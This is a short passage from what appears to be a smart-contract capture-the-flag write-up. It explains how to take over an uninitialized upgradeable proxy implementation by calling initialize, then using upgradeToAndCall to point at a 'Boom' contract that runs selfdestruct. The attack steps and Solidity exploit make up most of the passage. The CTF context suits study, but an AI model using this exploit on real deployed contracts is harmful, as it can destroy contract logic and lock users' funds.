Call the initialize function to make our player the upgrader. We can then call the upgradeToAndCall with the contract address of the below malicious contract.

As a result the selfdestruct on the new implementation contract is executed:

// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract Boom {
    function explode() public {
        selfdestruct(address(0));
    }
}